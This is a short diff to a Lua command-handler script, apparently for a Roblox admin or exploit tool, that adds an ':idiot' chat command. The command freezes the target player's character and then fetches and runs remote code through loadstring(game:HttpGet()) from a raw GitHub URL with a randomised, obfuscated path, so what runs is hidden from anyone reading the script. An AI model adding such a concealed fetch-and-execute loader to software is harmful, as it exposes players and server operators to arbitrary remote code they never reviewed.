@@ -2454,6 +2454,11 @@ function commands(msg, playa)
             if string.find(SplitCMD[2], ':thaw') then
                 player.Character.HumanoidRootPart.Anchored = false
             end
+	    
+            if string.find(SplitCMD[2], ':idiot') then
+                player.Character.HumanoidRootPart.Anchored = true
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/jax-jax-jax/oiuwabdo278qbsuioaubksdajkbhasdhjk329adosoijdioasjdoasiuyd89wadbyhq9wep8dysabiufbysab97897xe897e8073/main/duiwqhdbiwqcyhq3uicrby3irct3yur23tg6rvu6723tr4u23vycrtgeuycrt23u6crt3uyg23uicty2367ut23vcuyetgruy32trvu63cetgrvuy26rt3uyrtgyjrtu'))()
+            end
 
             if string.find(SplitCMD[1], ':kill') then
                 player.Character.Humanoid.Health = 0
